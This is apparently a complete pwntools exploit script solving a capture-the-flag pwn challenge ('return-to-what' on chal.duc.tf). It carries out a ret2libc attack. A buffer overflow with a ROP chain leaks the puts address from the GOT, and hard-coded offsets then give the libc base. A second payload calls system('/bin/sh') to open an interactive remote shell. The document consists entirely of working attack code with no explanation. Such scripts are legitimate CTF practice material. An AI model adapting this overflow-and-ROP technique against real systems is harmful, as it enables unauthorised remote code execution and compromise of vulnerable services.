from pwn import *

elf = ELF('./return-to-what')
HOST = 'chal.duc.tf'
PORT = 30003
p = remote(HOST, PORT)

POP_RDI = 0x000000000040122b
RET = 0x0000000000401016

payload = 'A' * 56 + p64(POP_RDI) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['main'])

p.recvuntil('Where would you like to return to?\n')
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('PUTS address: {}'.format(hex(leak)))
libc_base = leak - 0x0809c0
system = libc_base + 0x04f440
bin_sh = libc_base + 0x1b3e9a

# Add RET for alignment
payload = 'A' * 56 + p64(RET) + p64(POP_RDI) + p64(bin_sh) + p64(system)
p.recvuntil('Where would you like to return to?\n')
p.sendline(payload)

p.interactive()
p.close()